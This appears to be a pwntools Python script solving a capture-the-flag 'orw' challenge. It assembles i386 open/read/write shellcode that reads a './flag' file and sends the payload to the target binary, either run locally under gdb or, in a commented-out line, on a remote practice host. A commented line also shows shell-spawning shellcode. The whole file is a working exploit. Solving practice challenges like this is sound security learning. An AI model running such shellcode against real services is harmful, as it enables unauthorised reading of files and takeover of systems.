from pwn import *
from LibcSearcher import *
#context.terminal=['tmux','splitw','-h']
context(os='linux', arch='i386', kernel='i386',log_level='debug')

context.binary = "./orw"
context.log_level='debug'

io=gdb.debug('./pwn')
#io=process('./pwn')
#pause()
#io=remote('node4.buuoj.cn',27430)
s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil
ii=io.interactive

ru(b'shellcode:')
#gdb.attach(io)
#pause()
#payload=shellcode=asm(shellcraft.sh())

ad=0x0804A060+0x100

payload=shellcraft.open('./flag',0)
payload+=shellcraft.read('eax','esp',0x50)
payload+=shellcraft.write(1,'esp',0x50)
payload+=shellcraft.exit(0)
payload=asm(payload)


sl(payload)







ii()
